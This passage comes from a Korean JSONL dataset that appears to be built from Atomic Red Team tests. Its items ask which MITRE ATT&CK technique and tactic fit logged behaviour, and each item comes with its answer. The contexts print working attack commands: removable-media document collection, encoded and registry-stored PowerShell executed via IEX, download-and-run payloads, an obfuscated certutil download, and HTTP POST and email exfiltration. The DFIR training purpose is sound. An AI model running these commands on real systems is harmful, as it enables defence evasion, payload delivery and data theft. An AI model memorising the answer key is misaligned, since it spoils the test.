ATT&CK의 T1021.006 \"Remote Services: Windows Remote Management\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1025_T1025-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1025 Data from Removable Media (Tactic: Collection)\n[요약] PowerShell을 통해 현재 시스템에 연결된 이동식(Removable) 드라이브를 탐지하고, 각 드라이브에서 .docx, .xls, .txt, .pdf 등 문서 파일을 재귀적으로 검색한다. 이동식 드라이브가 없으면 'No removable media.'라는 메시지만 출력된다. 공격자가 USB 등에서 민감 문서를 수집하기 전 사전 탐색 단계로 활용할 수 있는 패턴이다.\n[절차] cmd.exe 또는 콘솔에서 제공된 PowerShell 호출 명령을 실행한다. PowerShell에서 Get-Volume으로 드라이브 목록을 조회한 뒤 DriveType이 'Removable'인 볼륨만 필터링한다. 각 이동식 드라이브에 대해 Get-ChildItem -Recurse -Include를 사용해 .doc*, .xls*, .txt, .pdf 확장자를 가진 파일을 모두 탐색한다. 발견된 각 파일의 전체 경로(FullName)를 표준 출력으로 출력한다. 만약 이동식 드라이브가 하나도 없으면 'No removable media.'라는 메시지를 출력하고 종료한다.\n[대표 명령 예시]\npowershell.exe -c \"Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }\"", "answer": "이 행위는 MITRE ATT&CK의 T1025 \"Data from Removable Media\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027_T1027-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027 Obfuscated Files or Information (Tactic: Defense Evasion)\n[요약] PowerShell 명령을 Base64로 인코딩한 뒤, -EncodedCommand 옵션으로 재실행하는 패턴을 시뮬레이션한다. 이는 많은 악성코드와 공격자가 탐지 우회를 위해 사용하는 전형적인 난독화 기법이다.\n[절차] 원본 PowerShell 명령 문자열(예: Write-Host \"Hey, Atomic!\")을 준비한다. 명령 문자열을 Unicode 바이트 배열로 변환한다. 바이트 배열을 Base64 문자열로 인코딩한다. powershell.exe -EncodedCommand <Base64> 형식으로 인코딩된 명령을 실행한다.\n[대표 명령 예시]\n$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand = [Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand", "answer": "이 행위는 MITRE ATT&CK의 T1027 \"Obfuscated Files or Information\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027_T1027-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027 Obfuscated Files or Information (Tactic: Defense Evasion)\n[요약] Base64 인코딩된 PowerShell 코드를 레지스트리에 저장한 뒤, 실행 시 레지스트리에서 읽어 디코딩·실행하는 패턴을 시뮬레이션한다. 이는 코드 저장 위치를 은폐하기 위해 자주 사용되는 기법이다.\n[절차] 원본 PowerShell 명령(예: Write-Host \"Hey, Atomic!\")을 Unicode 바이트 배열로 변환한다. 바이트 배열을 Base64 문자열로 인코딩한다. 지정된 레지스트리 키(예: HKCU:Software\\Microsoft\\Windows\\CurrentVersion)와 값 이름(예: Debug)에 Base64 문자열을 저장한다. powershell.exe에서 레지스트리 값을 읽어 Base64 디코딩 후 IEX(Invoke-Expression)으로 실행한다.\n[대표 명령 예시]\n$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand = [Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\"", "answer": "이 행위는 MITRE ATT&CK의 T1027 \"Obfuscated Files or Information\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027_T1027-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027 Obfuscated Files or Information (Tactic: Defense Evasion)\n[요약] 압축 파일(ZIP) 내부에 존재하는 실행 파일(T1027.exe)을 다운로드 후 압축 해제하여 실행하는 시나리오를 모사한다. GZ/ZIP 등 압축을 이용해 페이로드를 은닉해 전송한 뒤, 로컬에서 풀어 실행하는 전형적인 난독화·전달 방식이다.\n[절차] 외부 URL에서 T1027.zip 파일을 다운로드한다. 지정된 폴더(PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\)에 압축을 해제하여 T1027.exe를 생성한다. 압축 해제된 T1027.exe를 직접 실행하여(예: calculator.exe 실행) 페이로드 동작을 확인한다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"#{url_path}\" -OutFile \"PathToAtomicsFolder..\\ExternalPayloads\\T1027.zip\"\nExpand-Archive -path \"PathToAtomicsFolder..\\ExternalPayloads\\T1027.zip\" -DestinationPath \"PathToAtomicsFolder..\\ExternalPayloads\\temp_T1027.zip\\\" -Force\nPathToAtomicsFolder..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe", "answer": "이 행위는 MITRE ATT&CK의 T1027 \"Obfuscated Files or Information\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027_T1027-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027 Obfuscated Files or Information (Tactic: Defense Evasion)\n[요약] 신용카드 번호 등 민감 데이터를 VBA 매크로 내부에 포함한 XLSM 파일을 이메일 첨부로 외부로 전송하는 시나리오를 모사한다. 정적 DLP 정책이 평문 텍스트만 검사할 때, 매크로 내부에 숨겨진 데이터로 탐지를 우회하는 패턴이다.\n[절차] 민감 데이터를 포함하는 VBA 매크로(XLSM) 파일 경로를 준비한다. PowerShell의 Send-MailMessage cmdlet을 사용해 지정된 SMTP 서버로 메일을 전송한다. 메일 본문 또는 첨부파일로 매크로 파일을 전송해 DLP 탐지 회피 가능성을 시험한다.\n[대표 명령 예시]\nSend-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments \"#{input_file}\" -SmtpServer #{smtp_server}", "answer": "이 행위는 MITRE ATT&CK의 T1027 \"Obfuscated Files or Information\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027_T1027-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027 Obfuscated Files or Information (Tactic: Defense Evasion)\n[요약] 민감 데이터를 포함한 XLSM 매크로 파일 경로를 HTTP 요청 본문으로 전송하는 패턴을 시뮬레이션한다. 파일 내용 또는 경로를 HTTP POST로 내보내 DLP/웹 필터링 정책을 우회하려는 시나리오를 표현한다.\n[절차] 민감 데이터를 포함한 VBA 매크로(XLSM) 파일 경로를 준비한다. Invoke-WebRequest를 사용해 지정된 IP 주소로 HTTP POST 요청을 전송한다. 요청 Body에 파일 경로나 내용을 담아 외부로 유출하는 상황을 모사한다.\n[대표 명령 예시]\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body \"#{input_file}\"", "answer": "이 행위는 MITRE ATT&CK의 T1027 \"Obfuscated Files or Information\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027_T1027-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027 Obfuscated Files or Information (Tactic: Defense Evasion)\n[요약] 복잡한 문자열 조합, 타입 리플렉션, 숫자 배열 등을 사용해 난독화된 PowerShell 명령을 실행하여 최종적으로 \"Hello, from PowerShell!\" 문자열을 출력한다. 보고서에 등장한 실제 공격 예제를 기반으로 하는 난독화 패턴이다.\n[절차] 여러 Type() 호출과 문자열 포매팅을 사용해 System.String, Convert 등의 .NET 타입을 동적으로 구성한다. 숫자 배열과 ToInt16 변환 등을 활용해 문자 단위로 최종 문자열을 생성한다. Invoke-Expression 패턴(Invoke-Expression에 상응하는 동적 실행)을 이용해 난독화된 명령을 평가·실행한다. 최종적으로 \"Hello, from PowerShell!\"이 출력된다.\n[대표 명령 예시]\n$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )", "answer": "이 행위는 MITRE ATT&CK의 T1027 \"Obfuscated Files or Information\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027_T1027-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027 Obfuscated Files or Information (Tactic: Defense Evasion)\n[요약] certutil 명령에 특수 유니코드 대시, 오른쪽-좌측(RLO)·좌측-오른쪽(LRO) 제어 문자, 문자 치환 등을 섞어 다운로드 명령을 난독화하는 예제를 모사한다. 명령줄 모양은 변형되지만 실제로는 파일을 웹에서 내려받아 로컬에 저장한다.\n[절차] 사용자는 제공된 난독화 certutil 명령을 복사하여 커맨드 프롬프트에 붙여넣는다. 명령 내 #{remote_file}, #{local_path}를 실제 URL과 저장할 파일명으로 치환한다. 명령을 실행하면 certutil이 HTTP(S)로 원격 파일을 요청하고, 로컬 경로에 저장한다. 명령 줄에는 다양한 유니코드·제어 문자가 포함되어 있어 정규식 기반 탐지를 회피할 수 있다.\n[대표 명령 예시]\ncertutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −\"൏ᶠ൸\" #{remote_file} #{local_path}", "answer": "이 행위는 MITRE ATT&CK의 T1027 \"Obfuscated Files or Information\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027_T1027-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027 Obfuscated Files or Information (Tactic: Defense Evasion)\n[요약] Snake 악성코드 캠페인에서 관찰된 것처럼, 특정 경로에 암호화된 crmlog 파일을 생성하고 Hidden, System, Archive 속성을 부여해 은닉하는 동작을 재현한다. 이후 커널 드라이버나 별도 컴포넌트가 이 파일을 복호화해 사용할 수 있다.\n[절차] Windows 시스템 디렉터리(%windir%) 하위 registration 폴더에 GUID 형태의 파일명을 가진 .crmlog 파일을 생성한다. PowerShell에서 파일 객체의 Attributes를 Hidden, System, Archive로 설정하여 탐색기 기본 보기에서 보이지 않도록 한다. 콘솔에 생성된 파일 경로를 출력해 생성 여부를 확인한다.\n[대표 명령 예시]\n$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \"File created: $($file.FullName)\"", "answer": "이 행위는 MITRE ATT&CK의 T1027 \"Obfuscated Files or Information\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027_T1027-9_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027 Obfuscated Files or Information (Tactic: Defense Evasion)\n[요약] 압축 파일(t1027js.zip) 안에 포함된 JScript 파일을 다운로드·압축 해제한 뒤 실행해 계산기를 띄우는 시나리오를 모사한다. 이는 Gootloader 등이 사용하는, 압축된 스크립트 기반 페이로드 전달 및 실행 패턴을 재현한다.\n[절차] 외부 URL에서 t1027js.zip을 다운로드한다. 지정된 폴더에 압축을 해제해 T1027js.js 파일을 생성한다. T1027js.js를 실행하여(기본 Windows Script Host 연관) 내부에서 계산기 실행 등의 페이로드를 수행한다.\n[대표 명령 예시]\nNew-Item -Type Directory \"PathToAtomicsFolder..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"#{url_path}\" -OutFile \"PathToAtomicsFolder..\\ExternalPayloads\\T1027js.zip\"\nExpand-Archive -path \"PathToAtomicsFolder..\\ExternalPayloads\\T1027js.zip\" -DestinationPath \"PathToAtomicsFolder..\\ExternalPayloads\\temp_T1027js.zip\\\" -Force\nPathToAtomicsFolder..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js", "answer": "이 행위는 MITRE ATT&CK의 T1027 \"Obfuscated Files or Information\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027.004_T1027.004-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027.004 Obfuscated Files or Information: Compile After Delivery (Tactic: Defense Evasion)\n[요약] 전달된 C# 소스(calc.cs)를 .NET C# 컴파일러(csc.exe)를 통해 로컬에서 컴파일해 T1027.004.exe를 생성하는 시나리오다. 이는 공격자가 소스 코드를 먼저 투하한 뒤, 피해 시스템에서 최종 실행 파일을 만들어 실행하는 Compile After Delivery 패턴을 모사한다.\n[절차] 지정된 경로(PathToAtomicsFolder\\T1027.004\\src\\calc.cs)에 C# 소스 파일이 존재하는지 확인한다. 소스 파일이 없으면 Invoke-WebRequest를 이용해 GitHub에서 calc.cs를 다운로드한다. 명령 프롬프트에서 csc.exe를 호출해 /out 인자를 사용, calc.cs를 C:\\Windows\\Temp\\T1027.004.exe로 컴파일한다. 생성된 T1027.004.exe는 calc.exe를 숨겨진 cmd.exe 창을 통해 실행하는 기능을 포함한다. 테스트 종료 시 생성된 실행 파일(T1027.004.exe)을 삭제한다.\n[대표 명령 예시]\nif (-not (Test-Path \"PathToAtomicsFolder\\T1027.004\\src\\calc.cs\")) {\n  New-Item -Type Directory (Split-Path \"PathToAtomicsFolder\\T1027.004\\src\\calc.cs\") -ErrorAction Ignore | Out-Null\n  Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/calc.cs\" -OutFile \"PathToAtomicsFolder\\T1027.004\\src\\calc.cs\"\n}\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1027.004.exe \"PathToAtomicsFolder\\T1027.004\\src\\calc.cs\"", "answer": "이 행위는 MITRE ATT&CK의 T1027.004 \"Obfuscated Files or Information: Compile After Delivery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027.004_T1027.004-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027.004 Obfuscated Files or Information: Compile After Delivery (Tactic: Defense Evasion)\n[요약] T1027.004_DynamicCompile.exe를 실행해, 내부에서 C# 코드를 동적으로 컴파일/로드하는 동작을 트리거하는 시나리오다. 이 과정에서 .cmdline 파일 등이 생성될 수 있으며, 디스크에 별도의 소스 파일을 남기지 않고 런타임에 페이로드를 언팩·실행하는 패턴을 재현한다.\n[절차] 지정된 경로(PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe)에 테스트용 exe가 존재하는지 확인한다. 존재하지 않을 경우 Invoke-WebRequest를 사용해 GitHub에서 T1027.004_DynamicCompile.exe를 다운로드한다. PowerShell에서 Invoke-Expression으로 T1027.004_DynamicCompile.exe를 실행한다. 프로그램은 내부에서 C# 코드를 동적으로 컴파일하고 실행하는 과정을 거치며, 콘솔에 'T1027.004 Dynamic Compile' 문자열을 출력한다. 실행 중 임시 .cmdline 파일 등 C# 컴파일 산출물이 생성될 수 있으며, 이는 DFIR 관점에서 흔적으로 분석 가능하다.\n[대표 명령 예시]\nif (-not (Test-Path \"PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe\")) {\n  Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe -OutFile \"PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe\"\n}\nInvoke-Expression \"PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe\"", "answer": "이 행위는 MITRE ATT&CK의 T1027.004 \"Obfuscated Files or Information: Compile After Delivery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027.006_T1027.006-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027.006 HTML Smuggling (Tactic: Defense Evasion)\n[요약] 사전에 준비된 HTML 파일(T1027_006_Remote.html)을 실행해, 사용자 상호작용 없이 원격 ISO 파일(FeelTheBurn.iso)을 다운로드하는 HTML Smuggling 시나리오를 재현한다. 브라우저는 단순 HTML을 여는 것처럼 보이지만, 내부 스크립트가 원격 리소스를 내려 받아 로컬 Downloads 폴더에 저장한다.\n[절차] 지정된 경로(PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html)에 HTML 스머글링용 파일이 존재하는지 확인한다. 파일이 없으면 PowerShell Invoke-WebRequest를 사용해 GitHub 저장소에서 T1027_006_Remote.html을 다운로드하고, 해당 경로에 저장한다. PowerShell에서 & 연산자를 사용해 T1027_006_Remote.html을 실행(연결된 기본 브라우저로 열기)한다. 브라우저는 HTML 내부 스크립트에 의해 T1553.005에서 사용하는 FeelTheBurn.iso를 원격에서 자동 다운로드한다. 테스트 종료 후, 현재 사용자 프로파일의 Downloads 폴더에 생성된 FeelTheBurn.iso 파일을 삭제해 흔적을 정리할 수 있다.\n[대표 명령 예시]\nif (-not (Test-Path \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\")) {\n  New-Item -Type Directory \"PathToAtomicsFolder\\T1027.006\\bin\\\" -ErrorAction Ignore | Out-Null\n  Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html\" -OutFile \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\"\n}\n& \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\"", "answer": "이 행위는 MITRE ATT&CK의 T1027.006 \"HTML Smuggling\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027.007_T1027.007-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027.007 Obfuscated Files or Information: Dynamic API Resolution (Tactic: Defense Evasion)\n[요약] ninja_syscall1.exe를 실행해 NtCreateFile을 API 해싱과 동적 syscall 해석 방식으로 호출하는 시나리오를 재현한다. 성공 시 기본 사용자 프로필의 Temp 폴더에 hello.log 파일을 생성한 뒤, 동일 스크립트 내에서 삭제까지 수행한다. 동적 API 호출과 파일 생성 흔적을 DFIR 관점에서 관찰할 수 있다.\n[절차] 지정된 경로(PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe)에 실행 파일이 존재하는지 확인한다. 파일이 없으면 PowerShell Invoke-WebRequest를 사용해 GitHub에서 ninja_syscall1.exe를 다운로드하고 해당 경로에 저장한다. PowerShell에서 Start-Process 명령으로 ninja_syscall1.exe를 실행한 뒤, Start-Sleep -Seconds 7로 동작 완료를 기다린다. 실행된 ninja_syscall1.exe는 동적 API 해석과 syscall 조합(‘Ninja-syscall’)을 이용해 NtCreateFile을 호출하고, C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log 파일을 생성한다. PowerShell 스크립트는 hello.log 존재 여부를 확인하고, 존재하면 파일을 삭제한 뒤 \"[+] hello.log removed.\" 메시지를 출력한다.\n[대표 명령 예시]\nif (-not (Test-Path \"PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe\")) {\n  New-Item -Type Directory (Split-Path \"PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe\") -ErrorAction Ignore | Out-Null\n  Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.007/bin/ninja_syscall1.exe\" -OutFile \"PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe\"\n}\nStart-Process \"PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe\"\nStart-Sleep -Seconds 7\nif (Test-Path \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\") { Remove-Item \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\" -Force; Write-Host \"[+] hello.log removed.\" }", "answer": "이 행위는 MITRE ATT&CK의 T1027.007 \"Obfuscated Files or Information: Dynamic API Resolution\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027.013_T1027.013-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027.013 Obfuscated Files or Information: Encrypted/Encoded File (Tactic: Defense Evasion)\n[요약] Base64로 인코딩된 EICAR 문자열을 PowerShell에서 디코딩하여 텍스트 파일로 저장하는 시나리오를 재현한다. 이 과정에서 AV/EDR이 디코딩된 악성 패턴(EICAR)을 파일 생성 시점에 탐지할 수 있는지 확인할 수 있다.\n[절차] PowerShell 스크립트 내에 하드코딩된 Base64 인코딩 문자열(유사 EICAR 테스트 패턴)을 $encodedString 변수에 저장한다. System.Convert.FromBase64String을 사용해 $encodedString 값을 바이트 배열로 디코딩한다. System.Text.Encoding.UTF8.GetString을 사용해 디코딩된 바이트 배열을 문자열 형태로 변환한다. 변환된 문자열(디코딩된 EICAR 패턴)을 Out-File을 사용해 현재 작업 디렉터리에 T1027.013_decodedEicar.txt 이름으로 저장한다.\n[대표 명령 예시]\n$encodedString = \"WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=\"\n$bytes = [System.Convert]::FromBase64String($encodedString)\n$decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)\n\n#write the decoded eicar string to file\n$decodedString | Out-File T1027.013_decodedEicar.txt", "answer": "이 행위는 MITRE ATT&CK의 T1027.013 \"Obfuscated Files or Information: Encrypted/Encoded File\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1027.013_T1027.013-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1027.013 Obfuscated Files or Information: Encrypted/Encoded File (Tactic: Defense Evasion)\n[요약] ConvertTo-SecureString와 대칭 키를 이용해 암호화된 문자열을 복호화하고, 그 결과(EICAR 테스트 패턴)를 파일로 기록하는 시나리오를 재현한다. 실제 악성 코드에서 자주 사용하는 \"암호화된 페이로드 + 런타임 복호화\" 패턴을 단순화한 형태이다.\n[절차] PowerShell 스크립트 내에 암호화된 문자열을 $encryptedString 변수에 저장한다. 고정된 32바이트 길이의 대칭 키를 $key 배열에 정의한다. ConvertTo-SecureString -Key 옵션을 사용해 $encryptedString을 SecureString 형태로 복호화한다. Runtime.InteropServices.Marshal 클래스를 이용해 SecureString을 일반 문자열로 변환한다. 복호화된 문자열을 Out-File을 사용해 현재 작업 디렉터리에 T1027.013_decryptedEicar.txt 파일로 저장한다.\n[대표 명령 예시]\n$encryptedString = \"76492d1116743f0423413b16050a5345MgB8AGkASwA0AHMAbwBXAFoAagBkAFoATABXAGIAdAA5AFcAWAB1AFMANABVAEEAPQA9AHwAZQBjAGMANgAwADQAZAA0AGQAMQAwADUAYgA4ADAAMgBmADkAZgBjADEANQBjAGMANQBiAGMANwA2AGYANQBmADUANABhAGIAYgAyAGMANQA1AGQAMgA5ADEANABkADUAMgBiAGMANgA2AGMAMAAxADUAZABjADAAOABjAGIANAA1ADUANwBjADcAZQBlAGQAYgAxADEAOQA4AGIAMwAwADMANwAwADAANQA2ADQAOAA4ADkAZgA4ADMAZQA4ADgAOQBiAGEAMAA2ADMAMQAyADYAMwBiAGUAMAAxADgANAA0ADYAOAAxADQANQAwAGUANwBkADkANABjADcANQAxADgAYQA2ADMANQA4AGIAYgA1ADkANQAzAGIAMwAxADYAOAAwADQAMgBmADcAZQBjADYANQA5AGIANwBkADUAOAAyAGEAMgBiADEAMQAzAGQANABkADkAZgA3ADMAMABiADgAOQAxADAANAA4ADcAOQA5ADEAYQA1ADYAZAAzADQANwA3AGYANgAyADcAMAAwADEAMQA4ADEAZgA5ADUAYgBmAGYANQA3ADQAZQA4AGUAMAAxADUANwAwAGQANABiADMAMwA2ADgANwA0AGIANwAyADMAMQBhADkAZABhADEANQAzADQAMgAzADEANwAxADAAZgAxADkAYQA1ADEAMQA=\"\n$key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32\n\n$decrypt = ConvertTo-SecureString -String $encryptedString -Key $key\n$decryptedString = [Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($decrypt))\n\n#Write the decrypted eicar string 